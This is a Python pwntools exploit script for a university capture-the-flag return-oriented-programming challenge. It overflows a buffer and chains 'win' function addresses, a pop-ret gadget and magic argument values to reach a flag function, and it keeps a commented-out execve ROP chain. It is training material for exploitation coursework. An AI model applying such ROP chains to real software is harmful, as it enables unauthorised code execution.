#import from py
import re

#outside imports
from pwn import *

#used for pulling the flag from output
flag_regex = r"flag\{[^}]+\}"
global_timeout = 5 #seconds

#challenge-specific info
host = 'offsec-chalbroker.osiris.cyber.nyu.edu'
port = 1343
netid='pk1898'

do_remote = False
binary_name = './rop'

#for doing local debugging
is_local_dbg = True
gdb_script = '''
set pagination off
set disassembly-flavor intel
i proc mappings
b *0x080485cb
b *0x08048714
b *0x804878d
'''

#universal flag finder, given a string
def find_flag(input):
    m = re.findall(flag_regex, input)
    if(m != []):
        return m[0]
    else:
        return None


def solve(target):
    # DATA = ''
    # # DATA += 'A' * 2048
    # # DATA += p64(0x00400621)
    # # DATA += p64(0x00400621)
    # # DATA += p64(0x00400621)
    #
    # # uncomment these
    # DATA += ('AAAAAAAA')
    # DATA += ('AAAAAAAA')
    # DATA += ('AAAAAAAA')
    # DATA += ('AAAAAAAA')
    # DATA += ('AAAAAAAA')
    #
    # DATA += p64(0x00400646)  # first called after padding.
    # DATA += p64(0x3b)
    # DATA += p64(0x0040063e)
    # DATA += p64(0x00)
    # DATA += p64(0x00400636)
    # DATA += p64(0x00)
    # DATA += p64(0x0040062e)
    # DATA += p64(0x00400708)
    # DATA += p64(0x00400625)
    # print
    # target.read()
    # print
    # DATA
    #

    padding = 'A' * 28

    win1_addr = p64(0x80485cb)
    win2_addr = p64(0x80485d8)
    flag_addr = p64(0x804862b)

    pop_ret_gadget = p64(0x08048806)

    arg_check1 = p64(0xBAAAAAAD)
    arg_check2 = p64(0xDEADBAAD)

    exploit = padding + win1_addr + win2_addr + pop_ret_gadget + arg_check1 + flag_addr + pop_ret_gadget + arg_check2
    print exploit
    print target.recv()
    print target.sendline(exploit)
    print target.recv()

#universal target setup for remote-only
def target():
    if(do_remote):
        r = remote(host, port)
        r.sendline(netid)
        r.recvline() # eat interstitial
        return r
    else:
        if(is_local_dbg):
            target = gdb.debug(binary_name, gdb_script)
        else:
            target = process(binary_name)
        return target

#scaffolding
def main():
    with target() as p:
        flag = solve(p)
    if(flag):
        print "Challenge Solved: %s" % flag
    else:
        print "Challenge Not Solved"

if __name__ == '__main__':
    main()
